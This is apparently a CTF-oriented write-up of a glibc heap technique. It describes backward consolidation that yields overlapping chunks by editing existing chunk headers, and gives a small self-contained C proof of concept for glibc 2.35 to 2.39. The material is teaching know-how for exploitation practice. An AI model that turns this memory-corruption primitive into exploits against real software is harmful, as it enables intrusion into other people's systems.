<details>
<summary><strong>Description</strong></summary>
<p>

so in this instance, we will again be using backwards consolidation to allocate overlapping chunks (multiple ptrs to the same spot without freeing the chunk)...

**however, this differs from the previous example**. We will be leveraging existing chunks, and editing their chunk headers to accomplish this (no create fake chunk/main_arena -> no required heap leak)...

> this may be more useful in certain CTF...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {

    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, *chunk2, *chunk3, *first_consolidated_chunk, *overlapping_chunk;

    chunk0 = malloc(0x420);
    chunk1 = malloc(0x420); // this chunk will be reallocate without free...
    chunk2 = malloc(0x420); // backward consolidate chunk2 into chunk0
    chunk3 = malloc(0x18); // padding chunk to prevent consolidate with top chunk

    free(chunk0); // prepare a unsortedbin

    /*VULNERABILITY*/
    chunk0[-1] = 0x860; // expand chunk0's size (encompass first two chunks)
    chunk2[-1] = 0x430; // turn off prev_inuse bit of chunk2's size field
    /*VULNERABILITY*/

    chunk2[-2] = 0x860; // set chunk2's prev_size field (equal to fake chunk0's size) 

    free(chunk2); // trigger consolidation
    first_consolidated_chunk = malloc(0x420); // can padding this depend on purpose
    overlapping_chunk = malloc(0x420); // is the same as chunk1

    printf("first chunk allocated from consolidated chunk: %p\n", first_consolidated_chunk);
    printf("overlapping chunk: %p\n", overlapping_chunk);
    printf("chunk1 (still in use): %p\n", chunk1);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/malloc/overlapping_consolidation/readme.md

</p>
</details>